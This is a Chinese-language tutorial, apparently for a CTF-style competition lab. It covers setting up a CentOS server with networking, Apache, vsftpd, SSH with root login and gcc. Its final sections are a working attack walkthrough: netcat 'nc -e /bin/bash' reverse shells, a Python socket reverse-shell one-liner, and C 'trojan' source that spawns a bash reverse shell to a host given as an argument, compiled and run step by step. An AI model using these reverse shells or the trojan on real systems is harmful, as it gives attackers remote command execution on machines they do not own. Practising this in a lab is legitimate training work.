# centos比赛场景的服务器场景还原


### centos 自动联网
```shell
>>>cd /etc/sysconfig/network-scripts
>>>vi ifcfg-eth0 #修改ONBOOT=no 改为 ONBOOT=yes
>>>service network restart
```
### HTTP服务的安装
>下面是基础的使用知识，附赠一个php站点的搭建实例[dvwa搭建](http://blog.csdn.net/isinstance/article/details/54090936)
```shell
>>> yum install httpd 
>>> vim /etc/httpd/conf/httpd.conf #apache2的配置(题外话：apt-get install apache2　是一样的)
>>> echo "hello class" > /var/www/html/index.html #写一个首页

```

### FTP服务的安装

```shell
>>>yum install -y vsftpd #安装ftp服务
>>>yum install -y lftp #安装测试ftp服务的工具
>>>service vsftpd start #启动ftp服务
>>>service vsftpd status #查看服务的状态
>>>lftp 127.0.0.1 #查看是否可以链接ftp


```

### SSH服务的安装

```shell
>>>yum install openssh*#安装ssh服务，对应的(apt-get install ssh)
```
```shell
vi /etc/ssh/sshd_config #打开配置文件
```
把下面两个配置的＃去掉
```shell
PermitEmptyPasswords no
PasswordAuthentication yes
PermitRootLogin yes　＃确保root可以登录，同理如果做安全加固，这里要注释掉
```
重启
```shell
service sshd.service restart #重启服务
chkconfig sshd on　#设置开机启动
```

### GCC的安装
>gcc是c语言程序的编译程序

```shell
>>> yum install gcc* 
```

### python
>python是自带的不需要安装。。

### nmap
>[nmap详解](http://blog.csdn.net/github_35068711/article/details/51530422)

### c语言编译
>这里面我们讲解一下c语言程序简单的编译技巧
首先安装gcc
```shell
>>> yum install gcc*
```
其次写一个c代码的文件hello.c
```c
#include<stdlib.h>
    int main(int argc,char **argv)
    {
        printf("Hello,Linux.\n");
        exit(0);
    }
```
对单个文件进行编译

```shell
>>>gcc -o hello hello.c
>>>./hello #执行
```

### nc反射
>nc全名是netcat　是一个网络工具，这里面我们使用它来完成我们的反射需要两个电脑

在自己电脑上开启一个端口监听
```shell
>>> nc -l -p 8080 #在自己电脑监听8080端口，用来等待另外一端连接我们
>>> nc -e /bin/bash 192.168.1.101 8080 #在目标电脑上反向连接我们的电脑8080端口，ip是我们自己的ip
>>> ls #在我们自己电脑上执行命令，这就可以对服务器进行操作了，这个叫反射
```
下面我们来完成一个python语言版本的shell反射
```shell
>>> nc -l -p 8080 #在自己电脑监听8080端口，用来等待另外一端连接我们
>>> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
>>> ls #在本机执行命令
```

### 下面完成我们的任务，编译一个木马，然后利用nc反射一个shell
先编写一个简单的反射shell的c代码
```c
#include<stdlib.h>
main()
{
system(“nc -e /bin/bash 127.0.0.1”);
}
```
或者用下面的版本system.c，反正都是简单的实现
```c
#include<stdlib.h>
int main(int argc,char* argv[])
{
char shell_cmd[100];
sprintf(shell_cmd,"nc -e /bin/bash %s %s",argv[1],argv[2]);
system(shell_cmd);
}
```
### 下面我们来完成完成编译，执行，反射

```shell
>>> gcc -o shelltest system.c #编译c代码
>>> nc -l -p 8080 #本地电脑监听8080端口
>>>./shelltest 127.0.0.1 8080 ＃目标电脑木马反向连接自己的电脑
>>> ls #本地电脑执行命令验证结果
```
